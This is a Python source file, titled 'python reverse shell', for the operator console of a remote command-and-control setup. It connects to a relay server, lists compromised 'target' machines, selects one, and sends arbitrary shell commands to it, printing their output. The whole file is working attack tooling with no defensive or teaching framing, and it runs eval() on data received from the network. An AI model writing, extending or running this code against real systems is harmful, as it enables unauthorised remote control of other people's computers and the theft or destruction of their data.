# python reverse shell

import socket
import re
import sys
from prettytable import PrettyTable
import time
# Cli-Server
def cli_server():
    print()
    print('\tWelcom to Server Control Panel\n')
    HOST = input('Enter your server IP@ :')
    PORT = 8585
    BIND = (HOST,PORT)
    NoRespondMsg_CLI = '[!] connection was to CLI_server was closed\nExiting...'

    with socket.socket() as cli_server :
        try:
            cli_server.connect(BIND)
        except socket.error :
            print(f'[!] we could not connect to {HOST}:{PORT}')
            print('[!] Please Start the Server and try again')
            sys.exit()
        connections = []
        selected = []

        # Handling sendall Error if distination not connected
        def sendmsg(sendto, msg, enco=True):
            try:
                if enco is True:
                    sendto.sendall(msg.encode())
                elif enco is False:
                    sendto.sendall(msg)
            except Exception as Err:
                print(NoRespondMsg_CLI)
                sys.exit()
        # Handling recv Error if distination not connected
        def rcvmsg(from_con, buffer, deco=True):
            try:
                if deco is True:
                    return from_con.recv(buffer).decode()
                elif deco is False:
                    return from_con.recv(buffer)
            except Exception as Err:
                print(NoRespondMsg_CLI)
                sys.exit()
        def listen2rcv():
            sendmsg(cli_server,'listen2rcv',enco=True)
            conts = rcvmsg(cli_server,3600,deco=True)
            if conts == 'NOCONNECTIONWASFOUND':
                print('[!] No Connection was found Please Wait or Try Again !')
            elif conts != 'NOCONNECTIONWASFOUND' :
                print('[+] SOME CONNECTIONS WAS FOUND')
                conts = re.sub('dict_keys','',conts)
                conts = eval(conts)
                for c in conts :
                    if c not in connections:
                        connections.append(c)
        def listcon():
            if len(connections) > 0 :
                x = PrettyTable()
                x.field_names = ['Conn Number', 'Conn Addr', 'Port Number']
                for k in range(len(connections)):
                    x.add_row([k, connections[k][0], connections[k][1]])
                print(x)
            elif len(connections) <= 0 :
                print('[!] No Connection Found ')
                print('[!] Please try refreshing by using "listen2rcv" command')
        # select a connection
        def selectcon():
            if len(connections) > 0 :
                try :
                    select = int(input('select>>>'))
                    selected.clear()
                    try:
                        selected.append(connections[select])
                    except IndexError:
                        print('[!] Please Select a Number From "Conn Numbers" Colume')
                        selectcon()
                except ValueError :
                    print('[!] Please select a Connection number')
                    selectcon()
            elif len(connections) <= 0 :
                print('[!] No Connection Found ')
                print('[!] Please try refreshing by using "listen2rcv" command')
        # show selected connections
        def show_selected():
            if len(selected) == 1 :
                print()
                print('\t[+] You Select : ')
                x = PrettyTable()
                x.field_names = ['Conn Addr', 'Port Number']
                for k in range(len(selected)):
                    x.add_row([selected[k][0], selected[k][1]])
                print(x)
            elif len(selected) != 1 :
                print('[!] no connection selected')
        # Running Command
        def runcmd_oncon(addr):
            cli_server.sendall('RUNCMDONCLIENT'.encode())
            server_respond = cli_server.recv(3600).decode('utf-8')
            if server_respond == 'SENDTARGETCONN' :
                cli_server.sendall(str(addr).encode())
                cmdrun = input('cmdrun>>>').strip()
                while cmdrun != 'exit' :
                    if cmdrun and  cmdrun[0:2] != 'cd' :
                        cli_server.sendall(cmdrun.encode())
                        cmd_output = cli_server.recv(3600).decode()
                        print(cmd_output)
                    if cmdrun[0:2] == 'cd' and not cmdrun[2:]:
                        print('[!] Please Specify a path')
                    if cmdrun[0:2] == 'cd' and cmdrun[2:]:
                        cli_server.sendall(cmdrun.strip().encode())
                        check_path = cli_server.recv(3600).decode()
                        if check_path == 'TRUEPATH' :
                            pass
                        if check_path == 'FALSEPATH' :
                            print('[!] Path incorrect')
                    cmdrun = input('cmdrun>>>').strip()
                if cmdrun == 'exit':
                    cli_server.sendall("exit".encode())

        print('[?] use "help" or "?" for help')
        print('[?] use "exit" to exit')
        cmd = input('>>>').strip()
        while cmd != 'exit' :
            if cmd == 'help' or cmd == '?':
                print('Use : \n\tlisten2rcv : Refresh for see new connections \n\tlistcon : list all connections\n\tselect : selecting a connction by number\n\tshow select : check what you selecting\n\truncmd : for run command in target machine')
            if cmd == 'listen2rcv':
                conts = listen2rcv()
                # print(connections)
            if cmd == 'listcon':
                listcon()
            if cmd == 'select':
                selectcon()
            if cmd == 'show select':
                show_selected()
            if cmd == 'runcmd':
                if len(selected) == 1:
                    runcmd_oncon(selected[0])
                elif len(selected) != 1:
                    print('[!] no connection selected ')
                    print('[!] Select Please a Connection')
                    listcon()
                    selectcon()
                    if len(selected) == 1:
                        runcmd_oncon(selected[0])
            cmd = input('>>>').strip()
if __name__ == '__main__':
    cli_server()
